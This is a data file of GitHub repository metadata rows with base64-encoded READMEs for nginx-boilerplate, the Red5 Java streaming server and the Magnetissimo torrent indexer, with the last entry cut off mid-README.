b'nginx-boilerplate',10489882,b'Awesome Nginx configuration template',b'Dockerfile',1,2388,,2388,False,b'https://api.github.com/repos/nginx-boilerplate/nginx-boilerplate/forks',"IyBOZ2lueCBCb2lsZXJwbGF0ZSAKClshW0NoYXRdKGh0dHBzOi8vaW1nLnNo
aWVsZHMuaW8vZ2l0dGVyL3Jvb20vZ2l0dGVySFEvZ2l0dGVyLnN2ZyldKGh0
dHBzOi8vZ2l0dGVyLmltL25naW54LWJvaWxlcnBsYXRlL25naW54LWJvaWxl
cnBsYXRlKQoKQXdlc29tZSBOZ2lueCBjb25maWd1cmF0aW9uIHRlbXBsYXRl
IGFuZCBhIHNldCBvZiBoYW5keSBtdXN0LWhhdmUgc25pcHBldHMuCgojIyBG
ZWF0dXJlcwogKiBFeHByZXNzaXZlIGluY2x1ZGUtYmFzZWQgY29uZmlnCiAq
IE9wdGltaXplZCBkZWZhdWx0cwogKiBFYXN5IFBIUCBpbnRlZ3JhdGlvbgog
KiBDb25uZWN0aW9ucy9yZXF1ZXN0cyByYXRlIGxpbWl0aW5nIGFuZCB0aHJv
dHRsaW5nCiAqIFtBLWdyYWRlXShodHRwczovL3d3dy5zc2xsYWJzLmNvbS9z
c2x0ZXN0L2FuYWx5emUuaHRtbCkgU1NMIHNldHVwCiAqIEZhc3RDR0kgcmVz
cG9uc2UgY2FjaGluZwogKiBWYXJpb3VzIHByZWRlZmluZWQgbG9jYXRpb25z
CiAqIEFkdmFuY2VkIGxvZ2dpbmcKICogU0VPCiAqIERvY2tlci9Td2FybSBy
ZWFkeQoKIyMgUmVxdWlyZW1lbnRzCiAqIGBEb2NrZXJgID49IGAxLjEzYAog
KiBgZG9ja2VyLWNvbXBvc2VgID49IGAzLjFgCiAKQ29uZmlncyB0aGVtc2Vs
dmVzIGRlcGVuZCBvbiBgTmdpbnhgID49IGAxLjkuNWAsIGlmIHVzZWQgc2Vw
YXJhdGVseS4KIAojIyBVc2FnZQoKIyMjIEFic3RyYWN0Ck5naW54IGJvaWxl
cnBsYXRlIGJ1aWxkcyBvbiB0b3Agb2Ygb2ZmaWNpYWwgW25naW54XShodHRw
czovL2h1Yi5kb2NrZXIuY29tL18vbmdpbngvKSBhbmQgW3BocF0oaHR0cHM6
Ly9odWIuZG9ja2VyLmNvbS9fL3BocC8pIGFscGluZSBEb2NrZXIgaW1hZ2Vz
LgpBZGRpdGlvbmFsbHkgdHdvIGJhc2ljIGRvY2tlci1jb21wb3NlIGNvbmZp
Z3MgYXJlIHByb3ZpZGVkOiBgZG9ja2VyLWNvbXBvc2UueW1sYCBhbmQgYGRv
Y2tlci1jb21wb3NlLm92ZXJyaWRlLnltbGAuClRoZSBmaXJzdCBjb250YWlu
cyB0aGUgYmFzZS9wcm9kdWN0aW9uIHZlcnNpb24gb2YgdGhlIGRvY2tlciBy
dW4gY29uZmlnIHdoaWxlIHRoZSBzZWNvbmQgdHJhbnNwYXJlbnRseSBleHRl
bmRzIGl0IHRvIHByb3ZpZGUgZXh0cmEgZmVhdHVyZXMgZm9yIGxvY2FsIGRl
dmVsb3BtZW50LgpPbmx5IGBkb2NrZXItY29tcG9zZS55bWxgIHNob3VsZCBi
ZSB1c2VkIGluIHByb2R1Y3Rpb24uCgpgZG9ja2VyLWNvbXBvc2Uub3ZlcnJp
ZGUueW1sYCBhbHNvIGNvbnRhaW5zIGFuIGVtcHR5IHBocCBmcG0gaW5zdGFs
bGF0aW9uIGZvciB0aGUgc2FrZSBvZiB0aGUgZGVtby4gQWxzbyBiZWNhdXNl
IHRoZSBib2lsZXJwbGF0ZSBhc3N1bWVzIHRoZSB1c2FnZSBvZiBwaHAtZnBt
IGFuZCBmYWlscyB0byBzdGFydCBvdGhlcndpc2UuCgojIyMgQ2hlY2sgaXQg
b3V0CgpZb3Ugb25seSBuZWVkIGRvY2tlciBmb3IgdGhpcywgc2ltcGx5IHJ1
bjoKCmBgYGJhc2gKJCBkb2NrZXIgcnVuIC0tcm0gLWl0IC1wIDgwOjgwIC1w
IDQ0Mzo0NDMgbmdpbnhib2lsZXJwbGF0ZS9uZ2lueC1ib2lsZXJwbGF0ZQpg
YGAKCk5vdyBvcGVuIHVwIFtodHRwczovL2xvY2FsaG9zdC9nby9ob21lXSho
dHRwczovL2xvY2FsaG9zdC9nby9ob21lKSBpbiB5b3VyIGJyb3dzZXIhCgpB
bmQgc2luY2UgeW91IG9ubHkgcnVuIHRoZSBuZ2lueCBwYXJ0IHRoZXJlLCB0
aGVyZSdzIG5vIHN1cHBvcnQgZm9yIHBocC4KSWYgeW91IG9wZW4gdGhlIG1h
aW4gcGFnZSwgd2hpY2ggc3VwcG9zZWQgdG8gZ2l2ZSB5b3UgdGhlIGBwaHBp
bmZvYCBvdXRwdXQsIGl0J3MgZ29pbmcgdG8gbG9hZCBmb3IgMTAgc2Vjb2Rz
IGFuZCBnaXZlIHlvdSBhbiBlcnJvciBwYWdlLiAgCgojIyMgUnVubmluZyBp
dAoKRm9yIGEgcXVpY2sgYW5kIGRpcnR5IGxvY2FsaG9zdCBzZXR1cCBydW46
CmBgYGJhc2gKJCBkb2NrZXItY29tcG9zZSB1cCAtZApgYGAKCkJ5IGRlZmF1
bHQgdGhlIGJ1bmRsZWQgbmdpbnggaW1hZ2UgaXMgcHJvdmlkZWQgd2l0aCBz
ZWxmLXNpZ25lZCB3aWxkY2FyZCBjZXJ0aWZpY2F0ZSBmb3IgKi5sb2NhbGhv
c3QsIHNvIHlvdSB3aWxsIGhhdmUgdG8gaW5zdHJ1Y3QgeW91ciBicm93c2Vy
IHRvIHRydXN0IGl0LgoKIyMjIFJlbG9hZGluZwpUbyBub3QgaGF2ZSB0byBy
ZXN0YXJ0IGNvbnRhaW5lcnMgZWFjaCB0aW1lIHlvdSBtb2RpZnkgeW91ciBj
b25maWdzLCB5b3UgY2FuIHNpbXBseSBydW46CgpgYGBiYXNoCiQgZG9ja2Vy
LWNvbXBvc2UgZXhlYyBuZ2lueCBuZ2lueCAtcyByZWxvYWQKYGBgCgojIyMg
TG9ncwpCeSBkZWZhdWx0IGEgbmV3IGBsb2dzL2AgZGlyZWN0b3J5IHNob3Vs
ZCBiZSBjcmVhdGVkIGluIHRoZSBwcm9qZWN0IGRpcmVjdG9yeSwgdGhhdCBk
aXJlY3RseSBtYXBzIHRvIHRoZSBuZ2lueCBsb2dzIGRpcmVjdG9yeS4gCgoj
IyMjIERvY2tlciBzd2FybQpUbyBydW4gaW4gRG9ja2VyIHN3YXJtIGZpcnN0
IG1ha2Ugc3VyZSB5b3VyIERvY2tlciBzZXR1cCBpcyBpbiBzd2FybSBtb2Rl
OgoKYGBgYmFzaAokIGRvY2tlciBzd2FybSBpbml0CmBgYAoKRmlyc3Qgb2Yg
YWxsIHlvdSBuZWVkIHRvIGRlZmluZSB5b3VyIGRvbWFpbiBzc2wgY2VydGlm
aWNhdGUgYW5kIGtleSBhcyBhIHN3YXJtIHNlY3JldDoKCmBgYGJhc2gKJCBk
b2NrZXIgc2VjcmV0IGNyZWF0ZSBjZXJ0LmNydCB5b3VyX2NlcnRpZmljYXRl
LmNydAokIGRvY2tlciBzZWNyZXQgY3JlYXRlIGNlcnQua2V5IHlvdXJfY2Vy
dGlmaWNhdGVfa2V5LmtleQpgYGAKCk5vdyB0byBzdGFydCBvciB1cGRhdGUg
bmdpbnggKGFuZCBwaHApIHNlcnZpY2VzIGluIHRoZSBzd2FybSBydW46Cgpg
YGBiYXNoCiQgZG9ja2VyIHN0YWNrIGRlcGxveSAtYyBkb2NrZXItY29tcG9z
ZS55bWwgLS13aXRoLXJlZ2lzdHJ5LWF1dGggLS1wcnVuZSBhcHAKYGBgCgpU
byBzZWUgbmdpbnggbG9ncyBydW46CmBgYGJhc2gKJCBkb2NrZXIgc2Vydmlj
ZSBsb2dzIC1mIGFwcF9uZ2lueApgYGAKClRvIHNjYWxlIHNlcnZpY2VzOgpg
YGBiYXNoCiQgZG9ja2VyIHNlcnZpY2Ugc2NhbGUgYXBwX25naW54PTIgYXBw
X2ZwbT0xMApgYGAKCk5vdyB5b3UgY2FuIHJlZnJlc2ggdGhlIHBhZ2UgYSBj
b3VwbGUgb2YgdGltZXMgYW5kIG5vdGljZSBkaWZmZXJlbnQgaG9zdCBuYW1l
cyB0aGF0IHlvdXIgcmVxdWVzdHMgbGFuZCBvbi4KCiMjIyBDdXN0b21pemF0
aW9uCgpUaGUgbWFpbiB2aXJ0dWFsIGhvc3QgZGVmaW5pdGlvbiBpcyBsb2Nh
dGVkIGF0IGBzZXJ2ZXJzL21haW4uY29uZmAuClByb2JhYmx5IHRoZSBiZXN0
IHdheSB0byB3b3JrIHdpdGggdGhlIHJlcG8gaXMgYnkgY2xvbmluZyBpdCBh
bmQgaG9va2luZyB1cCBkb2NrZXIgaHViIHRvIGF1dG9tYXRpY2FsbHkgYnVp
bGQgYSBuZXcgaW1hZ2Ugd2hlbmV2ZXIgdGhlcmUncyBuZXcgY29kZS4KIAoK
IyMgSWYgc29tZXRoaW5nIGRvZXNuJ3Qgd29yawogKiBDaGVjayBlcnJvciBh
bmQgYWNjZXNzIGxvZ3MKICogW0NyZWF0ZSBhbiBpc3N1ZV0oaHR0cHM6Ly9n
aXRodWIuY29tL25naW54LWJvaWxlcnBsYXRlL25naW54LWJvaWxlcnBsYXRl
L2lzc3Vlcy9uZXcpIG9uIHRoZSBwcm9qZWN0J3MgZ2l0aHViIHBhZ2UK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'red5-server',14514767,b'Red5 Server core',b'Java',29,2388,,2388,False,b'https://api.github.com/repos/Red5/red5-server/forks',"cmVkNS1zZXJ2ZXIgLSBSZWQ1IHNlcnZlciBjb3JlCj09PT09PT09PT09Cgoh
W1RyYXZpc0NJXShodHRwczovL3RyYXZpcy1jaS5vcmcvUmVkNS9yZWQ1LXNl
cnZlci5zdmc/YnJhbmNoPW1hc3RlcikgClshW01hdmVuIENlbnRyYWxdKGh0
dHBzOi8vaW1nLnNoaWVsZHMuaW8vbWF2ZW4tY2VudHJhbC92L29yZy5yZWQ1
L3JlZDUtc2VydmVyLnN2ZyldKGh0dHA6Ly9zZWFyY2gubWF2ZW4ub3JnLyNz
ZWFyY2glN0NnYSU3QzElN0NnJTNBJTIyb3JnLnJlZDUlMjIpClshW1BScyBX
ZWxjb21lXShodHRwczovL2ltZy5zaGllbGRzLmlvL2JhZGdlL1BScy13ZWxj
b21lLWJyaWdodGdyZWVuLnN2Zz9zdHlsZT1mbGF0LXNxdWFyZSldKGh0dHA6
Ly9tYWtlYXB1bGxyZXF1ZXN0LmNvbSkKClJlZDUgaXMgYW4gT3BlbiBTb3Vy
Y2UgRmxhc2ggU2VydmVyIHdyaXR0ZW4gaW4gSmF2YSB0aGF0IHN1cHBvcnRz
OgoKICogU3RyZWFtaW5nIFZpZGVvIChGTFYsIEY0ViwgTVA0LCAzR1ApCiAq
IFN0cmVhbWluZyBBdWRpbyAoTVAzLCBGNEEsIE00QSwgQUFDKQogKiBSZWNv
cmRpbmcgQ2xpZW50IFN0cmVhbXMgKEZMViBhbmQgQVZDK0FBQyBpbiBGTFYg
Y29udGFpbmVyKQogKiBTaGFyZWQgT2JqZWN0cwogKiBMaXZlIFN0cmVhbSBQ
dWJsaXNoaW5nCiAqIFJlbW90aW5nCiAqIFByb3RvY29sczogUlRNUCwgUlRN
UFQsIFJUTVBTLCBhbmQgUlRNUEUKClRoZSBSZWQ1IHVzZXJzIGxpc3QgbWF5
IGJlIGZvdW5kIGhlcmU6IFtyZWQ1aW50ZXJlc3RdKGh0dHBzOi8vZ3JvdXBz
Lmdvb2dsZS5jb20vZm9ydW0vIyFmb3J1bS9yZWQ1aW50ZXJlc3QpCgpTdWJy
ZWRkaXQ6IFtyL3JlZDVdKGh0dHA6Ly93d3cucmVkZGl0LmNvbS9yL3JlZDUp
CgpBdXRvbWF0aWMgYnVpbGRzIChDb3VydGVzeSBvZiBBcGFjaGUgW09wZW5N
ZWV0aW5nc10oaHR0cDovL29wZW5tZWV0aW5ncy5hcGFjaGUub3JnLykpOiAK
ICogW1JlZDVdKGh0dHBzOi8vYnVpbGRzLmFwYWNoZS5vcmcvdmlldy9NLVIv
dmlldy9PcGVuTWVldGluZ3Mvam9iL1JlZDUtc2VydmVyLykKICogW1dpbmRv
d3MgSW5zdGFsbGVyXShodHRwczovL2J1aWxkcy5hcGFjaGUub3JnL3ZpZXcv
TS1SL3ZpZXcvT3Blbk1lZXRpbmdzL2pvYi9yZWQ1LWluc3RhbGxlci8pCgoj
IFtSZWxlYXNlc10oaHR0cHM6Ly9naXRodWIuY29tL1JlZDUvcmVkNS1zZXJ2
ZXIvcmVsZWFzZXMvbGF0ZXN0KQojIFtQcmV2aW91cyByZWxlYXNlc10oaHR0
cHM6Ly9naXRodWIuY29tL1JlZDUvcmVkNS1zZXJ2ZXIvYmxvYi9tYXN0ZXIv
UkVBRE1FLm1kI3ByZXZpb3VzLXJlbGVhc2VzKQoKPGk+Tm90ZSBvbiBCb290
c3RyYXA8L2k+CgpUaGUgYm9vdHN0cmFwIGFuZCBzaHV0ZG93biBjbGFzc2Vz
IGhhdmUgYmVlbiBtb3ZlZCB0byB0aGUgW3JlZDUtc2VydmljZV0oaHR0cHM6
Ly9naXRodWIuY29tL1JlZDUvcmVkNS1zZXJ2aWNlKSBwcm9qZWN0OyB0aGUg
ZGVwZW5kZW5jeSBoYXMgYmVlbiBhZGRlZCB0byB0aGlzIHByb2plY3RzIHBv
bS4KCiMgU3RhY2tPdmVyZmxvdwpJZiB5b3Ugd2FudCBhbnN3ZXJzIGZyb20g
YSBicm9hZGVyIGF1ZGllbmNlLCBbU3RhY2sgT3ZlcmZsb3ddKGh0dHA6Ly9z
dGFja292ZXJmbG93LmNvbS90YWdzL3JlZDUvaW5mbykgbWF5IGJlIHlvdXIg
YmVzdCBiZXQuCgojIE1hdmVuClJlbGVhc2VzIGFyZSBhdmFpbGFibGUgYXQg
W1NvbmF0eXBlIC0gUmVsZWFzZXNdKGh0dHBzOi8vb3NzLnNvbmF0eXBlLm9y
Zy9jb250ZW50L3JlcG9zaXRvcmllcy9yZWxlYXNlcy9vcmcvcmVkNS8pCgpT
bmFwc2hvdHMgYXJlIGF2YWlsYWJsZSBhdCBbU29uYXR5cGUgLSBTbmFwc2hv
dHNdKGh0dHBzOi8vb3NzLnNvbmF0eXBlLm9yZy9jb250ZW50L3JlcG9zaXRv
cmllcy9zbmFwc2hvdHMvb3JnL3JlZDUvKQoKSW5jbHVkZSB0aGUgcmVkNS1w
YXJlbnQgaW4geW91ciBfX3BvbS54bWxfXyAgaW4gdGhlIF9fZGVwZW5kZW5j
eU1hbmFnZW1lbnRfXyBzZWN0aW9uCmBgYHhtbAo8ZGVwZW5kZW5jeU1hbmFn
ZW1lbnQ+CiAgICA8ZGVwZW5kZW5jaWVzPgogICAgICA8ZGVwZW5kZW5jeT4K
ICAgICAgICAgIDxncm91cElkPm9yZy5yZWQ1PC9ncm91cElkPgogICAgICAg
ICAgPGFydGlmYWN0SWQ+cmVkNS1wYXJlbnQ8L2FydGlmYWN0SWQ+CiAgICAg
ICAgICA8dmVyc2lvbj4ke3JlZDUudmVyc2lvbn08L3ZlcnNpb24+CiAgICAg
ICAgICA8dHlwZT5wb208L3R5cGU+CiAgICAgIDwvZGVwZW5kZW5jeT4KICAg
IDwvZGVwZW5kZW5jaWVzPgo8L2RlcGVuZGVuY3lNYW5hZ2VtZW50PiAgCmBg
YAppbiBhZGRpdGlvbiB0byBhbnkgb3RoZXIgUmVkNSBwcm9qZWN0cyBpbiB0
aGUgX19kZXBlbmRlbmNpZXNfXyBzZWN0aW9uCmBgYHhtbAogIDxkZXBlbmRl
bmN5PgogICAgICA8Z3JvdXBJZD5vcmcucmVkNTwvZ3JvdXBJZD4KICAgICAg
PGFydGlmYWN0SWQ+cmVkNS1zZXJ2ZXI8L2FydGlmYWN0SWQ+CiAgICAgIDx2
ZXJzaW9uPiR7cmVkNS52ZXJzaW9ufTwvdmVyc2lvbj4KICAgICAgPHR5cGU+
amFyPC90eXBlPgogIDwvZGVwZW5kZW5jeT4KYGBgCgojIyBCdWlsZCBmcm9t
IFNvdXJjZQoKQXMgb2YgcmVsZWFzZSAxLjIuMiB0aGUgdGFyZ2V0IEpESyBp
cyBub3cgSkRLIDExIGFuZCB0aGUgTWF2ZW4gcG9tcyB1c2UgdGhlIFt0b29s
Y2hhaW4gcGx1Z2luXShodHRwczovL21hdmVuLmFwYWNoZS5vcmcvZ3VpZGVz
L21pbmkvZ3VpZGUtdXNpbmctdG9vbGNoYWlucy5odG1sKS4KClRvIGJ1aWxk
IHRoZSByZWQ1IGphcnMsIGV4ZWN1dGUgdGhlIGZvbGxvd2luZyBvbiB0aGUg
Y29tbWFuZCBsaW5lOgpgYGBzaAptdm4gLURtYXZlbi50ZXN0LnNraXA9dHJ1
ZSBpbnN0YWxsCmBgYApUaGlzIHdpbGwgY3JlYXRlIHRoZSBqYXJzIGluIHRo
ZSAidGFyZ2V0IiBkaXJlY3Rvcnkgb2YgdGhlIHdvcmtzcGFjZTsgdGhpcyB3
aWxsIGFsc28gc2tpcCB0aGUgdW5pdCB0ZXN0cy4KClRvIHBhY2thZ2UgZXZl
cnl0aGluZyB1cCBpbiBhbiBhc3NlbWJseSAodGFyYmFsbC96aXApOgpgYGBz
aAptdm4gLURtYXZlbi50ZXN0LnNraXA9dHJ1ZSBjbGVhbiBwYWNrYWdlIC1Q
IGFzc2VtYmxlCmBgYApUbyBidWlsZCBhIG1pbGVzdG9uZSB0YXJiYWxsOgpg
YGBzaAptdm4gLURtaWxlc3RvbmUudmVyc2lvbj0xLjAuNy1NMSBjbGVhbiBw
YWNrYWdlIC1QbWlsZXN0b25lCmBgYAoKIyBFY2xpcHNlCgoxLiBDcmVhdGUg
dGhlIGVjbGlwc2UgcHJvamVjdCBmaWxlcywgZXhlY3V0ZSB0aGlzIHdpdGhp
biByZWQ1LXNlcnZlciBkaXJlY3RvcnkuCmBgYHNoCm12biBlY2xpcHNlOmVj
bGlwc2UKYGBgCjIuIEltcG9ydCB0aGUgcHJvamVjdCBpbnRvIEVjbGlwc2Uu
CjMuIEFjY2VzcyB0aGUgcmlnaHQtY2xpY2sgbWVudSBhbmQgc2VsZWN0ICJD
b25maWd1cmUiIGFuZCB0aGVuICJDb252ZXJ0IHRvIE1hdmVuIFByb2plY3Qi
Lgo0LiBOb3cgdGhlIHByb2plY3Qgd2lsbCBidWlsZCBhdXRvbWF0aWNhbGx5
LCBpZiB5b3UgaGF2ZSB0aGUgbWF2ZW4gcGx1Z2luIGluc3RhbGxlZC4KCltT
Y3JlZW5jYXN0XShodHRwOi8vc2NyZWVuY2FzdC5jb20vdC8yc2dqTWV2Zjkp
CiAgCkZlYXR1cmVzIHN1cHBvcnRlZCB2aWEgcGx1Z2luIChUaGVzZSBhcmUg
bW9zdGx5IGRlcHJlY2F0ZWQpOgogKiBbV2ViU29ja2V0ICh3cyBhbmQgd3Nz
KV0oaHR0cHM6Ly9naXRodWIuY29tL1JlZDUvcmVkNS13ZWJzb2NrZXQpCiAq
IFtSVFNQIChGcm9tIEF4aXMtdHlwZSBjYW1lcmFzKV0oaHR0cHM6Ly9naXRo
dWIuY29tL1JlZDUvcmVkNS1ydHNwLXJlc3RyZWFtZXIpCiAqIFtITFNdKGh0
dHBzOi8vZ2l0aHViLmNvbS9SZWQ1L3JlZDUtaGxzLXBsdWdpbikKIAojIE9s
ZGVyIFJlbGVhc2VzClRoZSBhcnRpZmFjdHMgZm9yIHRoZSBmb2xsb3dpbmcg
cmVsZWFzZXMgYXJlIG5vIGxvbmdlciBhdmFpbGFibGU7IGlmIHlvdXIgcHJv
amVjdCByZXF1aXJlcyB0aGVtLCB5b3UnbGwgaGF2ZSB0byBidWlsZCB0aGVt
IGZyb20gc291cmNlLiBUaGUgbGlzdGluZ3MgYXJlIGhlcmUgb25seSBmb3Ig
aGlzdG9yaWNhbCBwdXJwb3Nlcy4KCiAqIFtSZWQ1IDEuMi4yIFJlbGVhc2Vd
KGh0dHBzOi8vZ2l0aHViLmNvbS9SZWQ1L3JlZDUtc2VydmVyL3JlbGVhc2Vz
L3RhZy92MS4yLjItUkVMRUFTRSkgKDUgU2VwdGVtYmVyIDIwMTkpCiAqIFtS
ZWQ1IDEuMS4xIFJlbGVhc2VdKGh0dHBzOi8vZ2l0aHViLmNvbS9SZWQ1L3Jl
ZDUtc2VydmVyL3JlbGVhc2VzL3RhZy92MS4xLjEtUkVMRUFTRSkgKDI5IE1h
eSAyMDE5KQogKiBbUmVkNSAxLjEuMCBSZWxlYXNlXShodHRwczovL2dpdGh1
Yi5jb20vUmVkNS9yZWQ1LXNlcnZlci9yZWxlYXNlcy90YWcvdjEuMS4wLVJF
TEVBU0UpICgyMiBBcHJpbCAyMDE5KQogKiBbUmVkNSAxLjAuMTAgUmVsZWFz
ZV0oaHR0cHM6Ly9naXRodWIuY29tL1JlZDUvcmVkNS1zZXJ2ZXIvcmVsZWFz
ZXMvdGFnL3YxLjAuMTAtUkVMRUFTRSkgKDkgRmVicnVhcnkgMjAxOSkKICog
W1JlZDUgMS4wLjkgUmVsZWFzZV0oaHR0cHM6Ly9naXRodWIuY29tL1JlZDUv
cmVkNS1zZXJ2ZXIvcmVsZWFzZXMvdGFnL3YxLjAuOS1SRUxFQVNFKSAoMTEg
SnVuZSAyMDE3KQogKiBbUmVkNSAxLjAuOCBSZWxlYXNlXShodHRwczovL2dp
dGh1Yi5jb20vUmVkNS9yZWQ1LXNlcnZlci9yZWxlYXNlcy90YWcvdjEuMC44
LVJFTEVBU0UpICgyMyBEZWNlbWJlciAyMDE2KQogKiBbUmVkNSAxLjAuNyBS
ZWxlYXNlXShodHRwczovL2dpdGh1Yi5jb20vUmVkNS9yZWQ1LXNlcnZlci9y
ZWxlYXNlcy90YWcvdjEuMC43LVJFTEVBU0UpICgxMiBNYXkgMjAxNikKICog
W1JlZDUgMS4wLjYgUmVsZWFzZV0oaHR0cHM6Ly9naXRodWIuY29tL1JlZDUv
cmVkNS1zZXJ2ZXIvcmVsZWFzZXMvdGFnL3YxLjAuNi1SRUxFQVNFKSAoOCBT
ZXB0ZW1iZXIgMjAxNSkKICogW1JlZDUgMS4wLjUgUmVsZWFzZV0oaHR0cHM6
Ly9naXRodWIuY29tL1JlZDUvcmVkNS1zZXJ2ZXIvcmVsZWFzZXMvdGFnL3Yx
LjAuNS1SRUxFQVNFKSAoNyBGZWJydWFyeSAyMDE1KQogKiBbUmVkNSAxLjAu
NCBSZWxlYXNlXShodHRwczovL2dpdGh1Yi5jb20vUmVkNS9yZWQ1LXNlcnZl
ci9yZWxlYXNlcy90YWcvdjEuMC40LVJFTEVBU0UpICgyNiBEZWNlbWJlciAy
MDE0KQogKiBbUmVkNSAxLjAuMyBSZWxlYXNlXShodHRwczovL2dpdGh1Yi5j
b20vUmVkNS9yZWQ1LXNlcnZlci9yZWxlYXNlcy90YWcvdjEuMC4zLVJFTEVB
U0UpICg1IEF1Z3VzdCAyMDE0KQogKiBSZWQ1IDEuMC4yIFJlbGVhc2UgKDkg
QXByaWwgMjAxNCkKICogUmVkNSAxLjAuMiBTbmFwc2hvdCAoMTggQXByaWwg
MjAxMykKICogUmVkNSAxLjAuMSBGaW5hbCAoMTQgSmFudWFyeSAyMDEzKQog
KiBSZWQ1IDEuMCBGaW5hbCAoMDMgRGVjZW1iZXIgMjAxMikKICogUmVkNSAw
LjkuMSBGaW5hbCAoMjEgRmVicnVhcnkgMjAxMCkKICogUmVkNSAwLjkuMCBG
aW5hbCAoMjcgSmFudWFyeSAyMDEwKQogKiBSZWQ1IDAuOC4wIEZpbmFsCgoj
IyMgRG9uYXRpb25zCkRvbmF0ZSB0byB0aGUgY2F1c2UgdXNpbmcKPHRhYmxl
PgogIDx0cj48dGQ+QlRDPC90ZD48dGQ+MTlBVWdKdVZ6QzhqZzE2YlNMSkRj
TTZOZm91aDlKdndLQTwvdGQ+PC90cj4KIMKgPHRyPjx0ZD5FVEg8L3RkPjx0
ZD4weDUxMTVlMDg1OTM3YmE1QjRBRWMwRkY1QzNjQWJGNmVFNTIzQjdEOTc8
L3RkPjwvdHI+CjwvdGFibGU+CjxpPkRvbmF0aW9ucyBhcmUgdXNlZCBmb3Ig
YmVlciBhbmQgc25hY2tzPC9pPgoK
",,"bGFuZ3VhZ2U6IGphdmEKamRrOgogIC0gb3BlbmpkazEx
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'magnetissimo',63957011,"b'Web application that indexes all popular torrent sites, and saves it to the local database.'",b'CSS',13,2388,,2388,False,b'https://api.github.com/repos/sergiotapia/magnetissimo/forks',"IVtodHRwczovL2kuaW1ndXIuY29tL0o2ZUIzbXAucG5nXShodHRwczovL2ku
aW1ndXIuY29tL0o2ZUIzbXAucG5nKQoKTWFnbmV0aXNzaW1vIGlzIGEgc2Vs
Zi1ob3N0ZWQgd2ViIGFwcGxpY2F0aW9uIHRoYXQgaW5kZXhlcyBhbGwgcG9w
dWxhciB0b3JyZW50IHNpdGVzLgoKIVtBIHNjcmVlbnNob3Qgb2YgTWFnbmV0
aXNzaW1vXShodHRwczovL2kuaW1ndXIuY29tL2VjSTQ1YUUucG5nKQoKIyMj
IEdvYWxzCgotICoqTm8gamF2YXNjcmlwdCoqCi0gQ3Jhd2wgbXVsdGlwbGUg
aW5kZXggc2l0ZXMgZm9yIHRvcnJlbnRzIGFuZCBtYWduZXQgbGlua3MuCi0g
RWFzaWx5IGludGVncmF0ZXMgd2l0aCBib3RoIFtTb25hcnJdKGh0dHBzOi8v
Z2l0aHViLmNvbS9Tb25hcnIvU29uYXJyKSBhbmQgW1JhZGFycl0oaHR0cHM6
Ly9naXRodWIuY29tL1JhZGFyci9SYWRhcnIpLgotIFJ1biB3aXRob3V0IGNl
cmVtb255LiBObyBuZWVkIGZvciBjb25maWd1cmF0aW9ucy4KLSBFYXN5IHRv
IHVuZGVyc3RhbmQgc291cmNlIGNvZGUuIFNwZWNpYWwgY2FyZSBpcyB0YWtl
biB0byBrZWVwIGNvZGUgbGVhbiBhbmQgdW5kZXJzdGFuZGFibGUuCi0gSGln
aCBwZXJmb3JtYW5jZSwgbGV2ZXJhZ2luZyBFbGl4aXIncyBHZW5TZXJ2ZXIg
YW5kIEVybGFuZydzIEJFQU0gVk0uCgpPbiBhdmVyYWdlIHRoZSBhcHBsaWNh
dGlvbiB1c2VzIGFib3V0IDEyME1CIG9mIFJBTToKCiFbaHR0cHM6Ly9pLmlt
Z3VyLmNvbS8zUWZDaHprLnBuZ10oaHR0cHM6Ly9pLmltZ3VyLmNvbS8zUWZD
aHprLnBuZykKCldlIHdvcmsgY2xvc2VseSB3aXRoIG90aGVyIHByb3ZpZGVy
cyBhbmQgc2VhcmNoIGVuZ2luZXMgdG8gYmUgcmVzcGVjdGZ1bCBvZiB0aGVp
ciBoYXJkd2FyZSBhbmQgbWluaW1pemUgb3VyIGltcGFjdCB0byB0aGVpciBz
eXN0ZW1zLgoKSWYgeW91J2QgbGlrZSB1cyB0byBhZGQgeW91IHRvIG91ciBz
dXBwb3J0ZWQgdmVuZG9ycyBsaXN0LCBwbGVhc2UgZHJvcCB1cyBhIEdpdGh1
YiBJc3N1ZS4KCiMjIyBVc2FnZSBHdWlkZQoKTWFnbmV0aXNzaW1vIHdhcyBk
ZXNpZ25lZCB0byBiZSBlYXN5IHRvIHJ1bi4KCkl0J3MgYmVlbiB0ZXN0ZWQg
b246CgotIEVybGFuZy9PVFAgMjEKLSBFbGl4aXIgMS44LjAKCldlIGhhdmUg
Z3VpZGUgd3JpdHRlbiBmb3IgeW91OgoKLSBbUnVubmluZyBpdCBsb2NhbGx5
XShodHRwczovL2dpdGh1Yi5jb20vc2VyZ2lvdGFwaWEvbWFnbmV0aXNzaW1v
L3dpa2kvVXNhZ2U6LUxvY2FsKQotIFtSdW5uaW5nIGl0IG9uIFVidW50dV0o
aHR0cHM6Ly9naXRodWIuY29tL3Nlcmdpb3RhcGlhL21hZ25ldGlzc2ltby93
aWtpL1VzYWdlOi1VYnVudHUtMTguMDQpCi0gUnVubmluZyBpdCBvbiBIZXJv
a3UgKHRvLWRvKQoKIyMjIENvbW11bml0eQoKV2FudCB0byB0YWxrIGFib3V0
IE1hZ25ldGlzc2ltbyBvciBzdWdnZXN0IGZlYXR1cmVzPyBXZSBoYXZlIGFu
IG9mZmljaWFsIERpc2NvcmQgc2VydmVyLgoKW0NsaWNrIHRvIGpvaW4gb3Vy
IG9mZmljaWFsIERpc2NvcmQgc2VydmVyXShodHRwczovL2Rpc2NvcmQuZ2cv
Q0Z0R1VhVykKCiMjIyBTdXBwb3J0ZWQgd2Vic2l0ZXMKClRoZSBmb2xsb3dp
bmcgd2Vic2l0ZXMgYXJlIGZ1bGx5IHN1cHBvcnRlZC4KCi0gMTMzN3gudG8K
